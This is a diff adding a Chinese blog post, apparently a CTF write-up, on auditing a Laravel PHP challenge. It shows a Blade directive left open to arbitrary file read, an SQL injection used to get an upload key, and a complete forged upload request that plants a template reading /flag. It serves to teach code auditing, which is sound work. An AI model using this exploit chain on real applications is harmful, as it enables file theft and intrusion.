@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#6c599f">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/./images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/./images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/./images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/./images/safari-pinned-tab-next.svg" color="#6c599f">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=EB Garamond, Noto Serif SC:300,300italic,400,400italic,700,700italic|Long Cang:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"localhost","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言前端时间做了一道CTF-php代码审计的题目，此题目说难也不算难，属于中等偏上一点点的题目。我在三个小时内做出来了，但是我忽然回顾我做这种代码审计题目的时候，发现这四年的比赛生涯，代码审计题目永远都是我的弱项，而且成长极慢。总是在一头雾水中开始，一头雾水中结束。所以我想梳理一下这道题目我是怎么做出来的，并解决以下问题：1、遇到代码审计的题目从哪里入手才是正确的2、做到哪里是难点，坚持不下去了，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一道php代码审计题目的心路历程">
+<meta property="og:url" content="http://localhost:4000/posts/%E4%B8%80%E9%81%93php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E7%9B%AE%E7%9A%84%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B/">
+<meta property="og:site_name" content="匆匆那年">
+<meta property="og:description" content="前言前端时间做了一道CTF-php代码审计的题目，此题目说难也不算难，属于中等偏上一点点的题目。我在三个小时内做出来了，但是我忽然回顾我做这种代码审计题目的时候，发现这四年的比赛生涯，代码审计题目永远都是我的弱项，而且成长极慢。总是在一头雾水中开始，一头雾水中结束。所以我想梳理一下这道题目我是怎么做出来的，并解决以下问题：1、遇到代码审计的题目从哪里入手才是正确的2、做到哪里是难点，坚持不下去了，">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-09-10T14:00:57.000Z">
+<meta property="article:modified_time" content="2022-03-23T06:56:18.425Z">
+<meta property="article:author" content="Geez">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="php">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://localhost:4000/posts/%E4%B8%80%E9%81%93php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E7%9B%AE%E7%9A%84%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>一道php代码审计题目的心路历程 | 匆匆那年</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">匆匆那年</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">钟声敲在你我耳边</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-fas fa-home"></i>首页</a>
+
+  </li>
+        
+            
+  <li class="menu-item menu-item-overview">
+
+    <a href="/overview/" rel="section"><i class="fa fa-fw fa-fas fa-archive"></i>总览</a>
+
+  </li>
+
+
+      
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-fas fa-location-arrow"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-friends">
+
+    <a href="/friends/" rel="section"><i class="fa fa-fw fa-fas fa-heart"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://localhost:4000/posts/%E4%B8%80%E9%81%93php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E7%9B%AE%E7%9A%84%E5%BF%83%E8%B7%AF%E5%8E%86%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Geez">
+      <meta itemprop="description" content="黑客,诗人,养龟仔">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="匆匆那年">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          一道php代码审计题目的心路历程
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发布：</span>
+
+              <time title="创建时间：2019-09-10 22:00:57" itemprop="dateCreated datePublished" datetime="2019-09-10T22:00:57+08:00">2019-09-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-23 14:56:18" itemprop="dateModified" datetime="2022-03-23T14:56:18+08:00">2022-03-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类：</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/overview/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前端时间做了一道CTF-php代码审计的题目，此题目说难也不算难，属于中等偏上一点点的题目。我在三个小时内做出来了，但是我忽然回顾我做这种代码审计题目的时候，发现这四年的比赛生涯，代码审计题目永远都是我的弱项，而且成长极慢。总是在一头雾水中开始，一头雾水中结束。所以我想梳理一下这道题目我是怎么做出来的，并解决以下问题：<br>1、遇到代码审计的题目从哪里入手才是正确的<br>2、做到哪里是难点，坚持不下去了，这时候应该怎么办<br>3、完全审计清楚，但是仍不会利用怎么办<br>旨在希望自己能真正的理解这些东西。<span id="more"></span></p>
+<h2 id="源码地址-amp-amp-一些交代"><a href="#源码地址-amp-amp-一些交代" class="headerlink" title="源码地址&amp;&amp;一些交代"></a>源码地址&amp;&amp;一些交代</h2><p>源码地址：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1qR5srrQLHNEgT_L1tPS79g">https://pan.baidu.com/s/1qR5srrQLHNEgT_L1tPS79g</a><br>第一次看到题目发现无法入手，所以猜测肯定有相应的源码泄露（这是经验，没法传授。）通过dirb扫描发现备份文件 backup。然后下载进行分析。</p>
+<h2 id="入手源码"><a href="#入手源码" class="headerlink" title="入手源码"></a>入手源码</h2><p>知识点1：查看是否是框架二次开发<br>拿到源码后首先看read.me发现是Laravel，如果没有readme可以去看配置文件和一些图片是否能发现是框架二次开发还是出题人自己写的php demo。</p>
+<p>知识点2：快速了解框架<br>我们这里发现这个源码时基于Laravel开发的，而我也是从来没用过Laravel，所以马上去学习了一下，大概十几分钟，搞懂laravel的用处。主要通过简介和开发手册来进行学习，只要了解大概就行了。<br>我通过阅读官方手册目录大概了解了这个php框架：<br><a target="_blank" rel="noopener" href="https://xueyuanjun.com/laravel-docs-5_6">https://xueyuanjun.com/laravel-docs-5_6</a></p>
+<p>知识点3：漏洞点的查找<br>这时候你需要一个分析器，毕竟手动来搞太慢了，CTF是快者的世界。我用的是最老的那种seay源代码审计系统，不过还是挺好用的。<br>我通过这个审计工具发现：&#x2F;app&#x2F;Providers&#x2F;AppServiceProvider.php 18行 存在任意文件读取漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Providers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">ServiceProvider</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Bootstrap any application services.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">boot</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    </span><br><span class="line">	<span class="title class_">\Blade</span>::<span class="title function_ invoke__">directive</span>(<span class="string">&#x27;filedata&#x27;</span>, function(<span class="variable">$expression</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;?php echo file_get_contents(<span class="subst">$expression</span>); ?&gt;&quot;</span>;</span><br><span class="line">            <span class="comment">//就是这里了 任意文件读取 但是这个东西是啥时候调用我们还不知道</span></span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Register any application services.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>知识点4：漫长的分析学习过程<br>通过漏洞点可知是一个任意文件读取，但是这个函数怎么调用我们不知道，而且对laravel也不太了解，所以我们搜索 —&gt;  laravel AppServiceProvider boot 方法如何调用<br>结果中显示 boot在register方法后调用，为了解决一些注册问题，反正对laravel也不太懂，先跳过，直接搜索 Blade::directivez 发现这个Blade是模板引擎，它可以进行模板的自定义，Blade::directive是进行指令注册，里面的参数就是指令名称，当blade模板渲染的时候对应指定如果存在就会被调用。所以这时候我想到的是模板注入调用指令filedata进行文件读取</p>
+<p>但是无论怎么测试都没有模板注入点，所以可能是文件上传进行模板注入。于是我利用seay源码审计系统对upload进行了搜索。发现&#x2F;routes&#x2F;web.php 确实有一处上传点，不过需要key</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/&#x27;</span>, function () &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">view</span>(<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;user_testpage/&#123;id&#125;&#x27;</span>, <span class="string">&#x27;UserController@index&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Auth</span>::<span class="title function_ invoke__">routes</span>();</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/home&#x27;</span>, <span class="string">&#x27;HomeController@index&#x27;</span>)-&gt;<span class="title function_ invoke__">name</span>(<span class="string">&#x27;home&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/home/profile&#x27;</span>,<span class="string">&#x27;ProfileController@show&#x27;</span>)-&gt;<span class="title function_ invoke__">name</span>(<span class="string">&#x27;profile&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/home/uploadto_upload&#x27;</span>,<span class="string">&#x27;HomeController@uploads&#x27;</span>)-&gt;<span class="title function_ invoke__">name</span>(<span class="string">&#x27;home&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/home/uploadss/&#123;key&#125;&#x27;</span>,<span class="string">&#x27;HomeController@uploadss&#x27;</span>)-&gt;<span class="title function_ invoke__">name</span>(<span class="string">&#x27;home&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>key我找了好久没有找到，于是重新回到这个文件继续审查看看有没有新的发现。结果发现<br>文件还有一个路径 user_testpage&#x2F;{id}，构造一个 user_testpage&#x2F;1 发现有回显，立马意识到可能是sqli注入。<br>经过测试发现确实是sql注入在数据库查到所有用户密码，发现key就是第二个用户名NotAllow6171。<br>然后我们审查上传代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uploadss</span>(<span class="params">Request <span class="variable">$request</span>,<span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$key</span>!=&lt;in database key&gt;)&#123;<span class="keyword">die</span>(<span class="string">&#x27;sorry!&#x27;</span>);&#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">isMethod</span>(<span class="string">&#x27;post&#x27;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">           <span class="variable">$file</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="string">&#x27;files&#x27;</span>);</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">isValid</span>()) &#123;</span><br><span class="line">               <span class="variable">$originalName</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientOriginalName</span>(); <span class="comment">//文件原名</span></span><br><span class="line">               <span class="variable">$ext</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientOriginalExtension</span>();     <span class="comment">//扩展名</span></span><br><span class="line">               <span class="variable">$realPath</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getRealPath</span>();  </span><br><span class="line">               <span class="variable">$type</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientMimeType</span>();</span><br><span class="line">               <span class="variable">$filecheck</span>=<span class="keyword">new</span> <span class="title class_">HomeController</span>();</span><br><span class="line">	        <span class="variable">$filecheck</span>-&gt;<span class="title function_ invoke__">filecheck</span>(<span class="variable">$realPath</span>);</span><br><span class="line">	        <span class="variable">$filename</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d-H-i-s&#x27;</span>) . <span class="string">&#x27;-&#x27;</span> . <span class="title function_ invoke__">uniqid</span>() . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">	        <span class="variable">$path</span>=<span class="variable">$file</span> -&gt; <span class="title function_ invoke__">move</span>(<span class="title function_ invoke__">base_path</span>().<span class="string">&#x27;/resources/views/auth/uploads&#x27;</span>,<span class="variable">$originalName</span>);  </span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+<p>审计后发现是上传到 &#x2F;resources&#x2F;views&#x2F;auth&#x2F;uploads 我们先进入目录查看其他php文件发现：函数调用就是直接    函数名+（“参数”） 于是我们构造 @filedata(‘&#x2F;flag’) 进行上传<br>构造上传，发现有CSRF 这个CSRF怎么过呢？再次查看routes&#x2F;web.php 发现还有另一处上传点，但是功能异常，所以我们通过这个上传点获得token来伪造一个上传数据包。那么数据包中应该是什么呢？肯定是要调用filedata 函数的 我们通过观察其他静态页面</p>
+<p>最终payload:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/home/uploadss/NotAllow6171</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>119.61.19.212:8085</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>444</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryvJNe9ABsnjeKGhDN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>XSRF-TOKEN=eyJpdiI6IitoWjhwMm1ycmNTWFozSmZTTXJwXC9nPT0iLCJ2YWx1ZSI6IkllczhnNEZodldZbllTN0NmZDErR2I1eXF1bU9mV1wvYklManNuUnQ4YzhJcmlWQ09JVXJPXC9JNHZxVU0xRmdCY0RDbWJHelVwYjQyVjdXQ1FHVlFMMlE9PSIsIm1hYyI6IjNmMGUzZTEwYTA2ZDA2MjJjMDg4OTY5NTI4NDJjNTk2YmQ4N2U4NWYxY2E2ZjU3YWEwNTAwODllMzIyYTU4ZjAifQ%3D%3D; laravel_session=eyJpdiI6InRhRzZmenBJSmFLNHhrb0RlUE5OdVE9PSIsInZhbHVlIjoiZ01qK2JpQURoRHgxbFVrcGc4TE9PK2kycGxSTjlNRzkwK21uVDUxa3UyTW5JYXpIcWJaY2pYbXQwNDc0dklkemNjRmR0aFhZcllmTkRvQXpVUlR3d3c9PSIsIm1hYyI6IjAwMjVkODA3YmY5NDU1Y2U5MDMyMWMwMTI1MTcyMmQ1YTU5NWQzMTE0MGMxMzc0ZWM1NDU4YzQ5MWIyZjI5YTgifQ%3D%3D</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryvJNe9ABsnjeKGhDN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;_token&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">Z7VZ7FXfNzuzETtQrZ7DeAZCFtbkQl9L8e7ptVin</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryvJNe9ABsnjeKGhDN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;files&quot;; filename=&quot;template.blade.php&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/html</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">@filedata(<span class="string">&#x27;/flag&#x27;</span>)</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryvJNe9ABsnjeKGhDN</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">Submit</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFor</span></span></span><br><span class="line"><span class="language-pgsql">mBoundaryvJNe9ABsnjeKGhDN<span class="comment">--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure>
+<h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>1、先搞懂框架、找到危险函数，也就是利用点，然后一条线分析下去。<br>2、遇到难点，审计不下去的时候，利用辅助工具，去查找一些敏感的函数 比如 login upload cookie sql语句等 也可以直接自动审计看看有什么思路。<br>3、完全审计清楚代码逻辑，但是不知道怎么利用的时候就多去百度对应函数，并百度对应框架的漏洞，参考别人的思路。仔细查看一些已经存在的文件。如果还是不知道如何利用那就是没看懂框架，再去跟一边正常功能的框架是如何实现的，函数是如何调用的！</p>
+
+    </div>
+
+    
+    
+    
+
+
+<span style="margin-top:30px; color:var(--blockquote-color); font-size:0.85em">
+        <br>
+        <span class="post-end-item" title="copyright"">
+            <span class="post-end-item-icon" style="margin-right: 3px">
+                <i class="fab fa-fw fa-creative-commons"></i>
+            </span>
+            <span class="post-end-item-text">采用署名-非商业性使用-相同方式共享 4.0（CC BY-NC-SA 4.0）许可协议</span>
+        </span>
+</span>
+
+
+
+
+
+<div class="donations">
+    <div class="donation-label">「分享也是一种学习」</div>
+</div>
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/overview/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="fa fa-tag"></i> 代码审计</a>
+              <a href="/overview/tags/php/" rel="tag"><i class="fa fa-tag"></i> php</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/MS2019_0708%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/" rel="prev" title="MS2019_0708复现笔记">
+      <i class="fa fa-chevron-left"></i> MS2019_0708复现笔记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/phpstudy%E5%90%8E%E9%97%A8%E4%BA%8B%E4%BB%B6/" rel="next" title="phpstudy后门事件">
+      phpstudy后门事件 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
